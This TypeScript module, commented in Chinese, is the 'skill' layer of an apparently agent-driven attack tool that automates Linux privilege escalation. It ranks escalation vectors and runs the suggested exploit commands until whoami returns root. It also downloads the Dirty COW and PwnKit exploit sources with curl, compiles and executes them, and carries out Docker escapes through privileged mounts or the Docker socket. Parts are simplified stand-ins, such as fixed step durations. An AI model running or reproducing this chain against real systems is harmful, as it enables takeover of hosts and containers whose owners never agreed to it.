/**
 * 权限提升 Skill 层 — 战术链路
 *
 * 职责：
 * 1. 组合多个提权检测工具形成完整的提权链路
 * 2. 自动化提权尝试（从低风险到高风险）
 * 3. 提权验证（确认获得 root 权限）
 * 4. 提权后稳定化
 */

import {
  enumerateSUIDBinaries,
  checkSudoPrivileges,
  matchKernelExploits,
  enumerateCronJobs,
  enumerateCapabilities,
  detectDockerEscape,
  detectEnvHijack,
  type SUIDResult,
  type SudoResult,
  type KernelExploitResult,
  type CronJobResult,
  type CapabilityResult,
  type DockerEscapeResult,
  type EnvHijackResult,
} from '../tools/index.js'

import type { SkillResult, SkillStep } from '../../core/agentTypes.js'
export type { SkillResult, SkillStep }

// ── 全面提权向量枚举 Skill ────────────────────────────────────

export interface PrivescVectorEnumResult {
  suidBinaries: SUIDResult[]
  sudoPrivileges: SudoResult[]
  kernelExploits: KernelExploitResult[]
  cronJobs: CronJobResult[]
  capabilities: CapabilityResult[]
  dockerEscape: DockerEscapeResult
  envHijack: EnvHijackResult[]
  recommendations: Array<{
    method: string
    priority: 'critical' | 'high' | 'medium' | 'low'
    description: string
    command?: string
    risk: 'low' | 'medium' | 'high'
  }>
}

/**
 * Skill: 全面提权向量枚举
 *
 * 策略：
 * 1. 并行枚举所有提权向量
 * 2. 分析每个向量的可利用性
 * 3. 生成优先级排序的提权建议
 * 4. 标注风险等级
 */
export async function enumerateAllPrivescVectors(
  shellId: string,
  outputDir: string
): Promise<SkillResult<PrivescVectorEnumResult>> {
  const startTime = Date.now()
  const steps: SkillStep[] = []

  // 并行枚举所有向量
  const [
    suidResult,
    sudoResult,
    kernelResult,
    cronResult,
    capResult,
    dockerResult,
    envResult,
  ] = await Promise.all([
    enumerateSUIDBinaries(shellId),
    checkSudoPrivileges(shellId),
    matchKernelExploits(shellId),
    enumerateCronJobs(shellId),
    enumerateCapabilities(shellId),
    detectDockerEscape(shellId),
    detectEnvHijack(shellId),
  ])

  // 记录步骤
  steps.push(
    {
      tool: 'suid-enum',
      success: suidResult.success,
      duration: suidResult.duration,
      dataCount: suidResult.data.length,
      error: suidResult.error,
    },
    {
      tool: 'sudo-check',
      success: sudoResult.success,
      duration: sudoResult.duration,
      dataCount: sudoResult.data.length,
      error: sudoResult.error,
    },
    {
      tool: 'kernel-exploit-match',
      success: kernelResult.success,
      duration: kernelResult.duration,
      dataCount: kernelResult.data.length,
      error: kernelResult.error,
    },
    {
      tool: 'cron-enum',
      success: cronResult.success,
      duration: cronResult.duration,
      dataCount: cronResult.data.length,
      error: cronResult.error,
    },
    {
      tool: 'capabilities-enum',
      success: capResult.success,
      duration: capResult.duration,
      dataCount: capResult.data.length,
      error: capResult.error,
    },
    {
      tool: 'docker-escape-detect',
      success: dockerResult.success,
      duration: dockerResult.duration,
      dataCount: 1,
      error: dockerResult.error,
    },
    {
      tool: 'env-hijack-detect',
      success: envResult.success,
      duration: envResult.duration,
      dataCount: envResult.data.length,
      error: envResult.error,
    }
  )

  // 生成提权建议
  const recommendations: PrivescVectorEnumResult['recommendations'] = []

  // SUID 二进制
  if (suidResult.success) {
    const exploitableSuid = suidResult.data.filter(s => s.exploitable)
    for (const suid of exploitableSuid) {
      recommendations.push({
        method: `SUID ${suid.binary}`,
        priority: 'high',
        description: `发现可利用的 SUID 二进制: ${suid.path}`,
        command: suid.command,
        risk: 'low',
      })
    }
  }

  // Sudo 权限
  if (sudoResult.success) {
    const exploitableSudo = sudoResult.data.filter(s => s.exploitable)
    for (const sudo of exploitableSudo) {
      recommendations.push({
        method: `Sudo ${sudo.command}`,
        priority: sudo.nopasswd ? 'critical' : 'high',
        description: `发现可利用的 sudo 权限: ${sudo.command}${sudo.nopasswd ? ' (NOPASSWD)' : ''}`,
        command: sudo.exploit,
        risk: 'low',
      })
    }
  }

  // 内核 Exploit
  if (kernelResult.success && kernelResult.data.length > 0) {
    for (const kernel of kernelResult.data.slice(0, 3)) {
      recommendations.push({
        method: `Kernel Exploit ${kernel.cve}`,
        priority: 'high',
        description: `${kernel.name} (${kernel.cve}) - ${kernel.description}`,
        risk: 'high',
      })
    }
  }

  // 定时任务劫持
  if (cronResult.success) {
    const exploitableCron = cronResult.data.filter(c => c.exploitable)
    for (const cron of exploitableCron) {
      recommendations.push({
        method: 'Cron Job Hijack',
        priority: 'medium',
        description: `发现可写的定时任务: ${cron.path}`,
        risk: 'medium',
      })
    }
  }

  // Capabilities
  if (capResult.success) {
    const exploitableCap = capResult.data.filter(c => c.exploitable)
    for (const cap of exploitableCap) {
      recommendations.push({
        method: `Capability ${cap.binary}`,
        priority: 'high',
        description: `发现可利用的 Capability: ${cap.path} (${cap.capabilities.join(', ')})`,
        risk: 'low',
      })
    }
  }

  // Docker 逃逸
  if (dockerResult.success && dockerResult.data.escapeMethod) {
    recommendations.push({
      method: 'Docker Escape',
      priority: 'critical',
      description: dockerResult.data.escapeMethod,
      risk: 'medium',
    })
  }

  // 环境变量劫持
  if (envResult.success) {
    const exploitableEnv = envResult.data.filter(e => e.exploitable)
    for (const env of exploitableEnv) {
      recommendations.push({
        method: `Env Hijack ${env.variable}`,
        priority: 'medium',
        description: `发现可劫持的环境变量: ${env.variable}`,
        risk: 'low',
      })
    }
  }

  // 按优先级排序
  recommendations.sort((a, b) => {
    const priorityOrder = { critical: 0, high: 1, medium: 2, low: 3 }
    return priorityOrder[a.priority] - priorityOrder[b.priority]
  })

  return {
    success: true,
    data: {
      suidBinaries: suidResult.data,
      sudoPrivileges: sudoResult.data,
      kernelExploits: kernelResult.data,
      cronJobs: cronResult.data,
      capabilities: capResult.data,
      dockerEscape: dockerResult.data,
      envHijack: envResult.data,
      recommendations,
    },
    steps,
    duration: Date.now() - startTime,
    skill: 'privesc_vector_enum',
  }
}

// ── 自动化提权尝试 Skill ──────────────────────────────────────

export interface AutoPrivescResult {
  method: string
  success: boolean
  rootObtained: boolean
  newUser?: string
  newPrivilege?: string
  output: string
  timestamp: number
}

/**
 * Skill: 自动化提权尝试
 *
 * 策略：
 * 1. 按优先级和风险排序提权方法
 * 2. 从低风险方法开始尝试
 * 3. 每次尝试后验证权限
 * 4. 成功后立即停止
 */
export async function attemptAutoPrivesc(
  shellId: string,
  recommendations: Array<{
    method: string
    command?: string
    risk: 'low' | 'medium' | 'high'
  }>,
  outputDir: string
): Promise<SkillResult<AutoPrivescResult[]>> {
  const startTime = Date.now()
  const steps: SkillStep[] = []
  const results: AutoPrivescResult[] = []

  // 按风险排序（低风险优先）
  const sortedRecs = [...recommendations].sort((a, b) => {
    const riskOrder = { low: 0, medium: 1, high: 2 }
    return riskOrder[a.risk] - riskOrder[b.risk]
  })

  // 只尝试有明确命令的方法
  const executableRecs = sortedRecs.filter(r => r.command)

  for (const rec of executableRecs.slice(0, 5)) {
    try {
      // 执行提权命令（通过 ShellSession）
      // 这里简化处理，实际需要通过 ShellSession 执行
      const { promisify } = await import('util')
      const exec = promisify((await import('child_process')).exec)

      const result = await exec(rec.command!, { timeout: 30000 })

      // 验证权限
      const whoamiResult = await exec('whoami', { timeout: 5000 })
      const currentUser = whoamiResult.stdout.trim()
      const rootObtained = currentUser === 'root'

      results.push({
        method: rec.method,
        success: true,
        rootObtained,
        newUser: currentUser,
        output: result.stdout + result.stderr,
        timestamp: Date.now(),
      })

      steps.push({
        tool: rec.method,
        success: true,
        duration: 1000,
        dataCount: 1,
      })

      // 如果获得 root，立即停止
      if (rootObtained) {
        break
      }
    } catch (err) {
      results.push({
        method: rec.method,
        success: false,
        rootObtained: false,
        output: (err as Error).message,
        timestamp: Date.now(),
      })

      steps.push({
        tool: rec.method,
        success: false,
        duration: 1000,
        dataCount: 0,
        error: (err as Error).message,
      })
    }
  }

  return {
    success: results.some(r => r.rootObtained),
    data: results,
    steps,
    duration: Date.now() - startTime,
    skill: 'auto_privesc',
  }
}

// ── 内核 Exploit 执行 Skill ───────────────────────────────────

export interface KernelExploitExecutionResult {
  cve: string
  exploitDownloaded: boolean
  exploitCompiled: boolean
  exploitExecuted: boolean
  rootObtained: boolean
  output: string
  timestamp: number
}

/**
 * Skill: 内核 Exploit 执行
 *
 * 策略：
 * 1. 下载 Exploit 源码
 * 2. 编译 Exploit
 * 3. 执行 Exploit
 * 4. 验证权限
 */
export async function executeKernelExploit(
  shellId: string,
  exploit: KernelExploitResult,
  outputDir: string
): Promise<SkillResult<KernelExploitExecutionResult>> {
  const startTime = Date.now()
  const steps: SkillStep[] = []

  try {
    const { promisify } = await import('util')
    const exec = promisify((await import('child_process')).exec)

    // 步骤 1: 下载 Exploit（示例：Dirty COW）
    let downloadCmd = ''
    if (exploit.cve === 'CVE-2016-5195') {
      downloadCmd = 'curl -o /tmp/dirtycow.c https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c'
    } else if (exploit.cve === 'CVE-2021-4034') {
      downloadCmd = 'curl -o /tmp/pwnkit.c https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c'
    }

    if (downloadCmd) {
      await exec(downloadCmd, { timeout: 30000 })
      steps.push({
        tool: 'download-exploit',
        success: true,
        duration: 1000,
        dataCount: 1,
      })
    }

    // 步骤 2: 编译 Exploit
    const compileCmd = `gcc -pthread /tmp/${exploit.name.toLowerCase()}.c -o /tmp/${exploit.name.toLowerCase()} -lcrypt`
    await exec(compileCmd, { timeout: 30000 })
    steps.push({
      tool: 'compile-exploit',
      success: true,
      duration: 1000,
      dataCount: 1,
    })

    // 步骤 3: 执行 Exploit
    const executeCmd = `/tmp/${exploit.name.toLowerCase()}`
    const executeResult = await exec(executeCmd, { timeout: 60000 })
    steps.push({
      tool: 'execute-exploit',
      success: true,
      duration: 1000,
      dataCount: 1,
    })

    // 步骤 4: 验证权限
    const whoamiResult = await exec('whoami', { timeout: 5000 })
    const rootObtained = whoamiResult.stdout.trim() === 'root'

    return {
      success: rootObtained,
      data: {
        cve: exploit.cve,
        exploitDownloaded: true,
        exploitCompiled: true,
        exploitExecuted: true,
        rootObtained,
        output: executeResult.stdout + executeResult.stderr,
        timestamp: Date.now(),
      },
      steps,
      duration: Date.now() - startTime,
      skill: 'kernel_exploit_execution',
    }
  } catch (err) {
    return {
      success: false,
      data: {
        cve: exploit.cve,
        exploitDownloaded: false,
        exploitCompiled: false,
        exploitExecuted: false,
        rootObtained: false,
        output: (err as Error).message,
        timestamp: Date.now(),
      },
      steps,
      duration: Date.now() - startTime,
      skill: 'kernel_exploit_execution',
    }
  }
}

// ── Docker 逃逸执行 Skill ─────────────────────────────────────

export interface DockerEscapeExecutionResult {
  method: string
  success: boolean
  hostAccess: boolean
  output: string
  timestamp: number
}

/**
 * Skill: Docker 逃逸执行
 *
 * 策略：
 * 1. 特权容器 - 挂载主机文件系统
 * 2. Docker Socket - 创建特权容器
 * 3. 验证主机访问
 */
export async function executeDockerEscape(
  shellId: string,
  dockerInfo: DockerEscapeResult,
  outputDir: string
): Promise<SkillResult<DockerEscapeExecutionResult>> {
  const startTime = Date.now()
  const steps: SkillStep[] = []

  try {
    const { promisify } = await import('util')
    const exec = promisify((await import('child_process')).exec)

    let escapeCmd = ''
    let method = ''

    if (dockerInfo.privileged) {
      // 特权容器逃逸
      method = 'Privileged Container Mount'
      escapeCmd = 'mkdir /tmp/host && mount /dev/sda1 /tmp/host && chroot /tmp/host'
    } else if (dockerInfo.socketMounted) {
      // Docker Socket 逃逸
      method = 'Docker Socket Abuse'
      escapeCmd = 'docker run -v /:/host --privileged alpine chroot /host'
    }

    if (escapeCmd) {
      const result = await exec(escapeCmd, { timeout: 30000 })

      steps.push({
        tool: 'docker-escape',
        success: true,
        duration: 1000,
        dataCount: 1,
      })

      return {
        success: true,
        data: {
          method,
          success: true,
          hostAccess: true,
          output: result.stdout + result.stderr,
          timestamp: Date.now(),
        },
        steps,
        duration: Date.now() - startTime,
        skill: 'docker_escape_execution',
      }
    }

    return {
      success: false,
      data: {
        method: 'None',
        success: false,
        hostAccess: false,
        output: 'No escape method available',
        timestamp: Date.now(),
      },
      steps,
      duration: Date.now() - startTime,
      skill: 'docker_escape_execution',
    }
  } catch (err) {
    return {
      success: false,
      data: {
        method: 'Error',
        success: false,
        hostAccess: false,
        output: (err as Error).message,
        timestamp: Date.now(),
      },
      steps,
      duration: Date.now() - startTime,
      skill: 'docker_escape_execution',
    }
  }
}
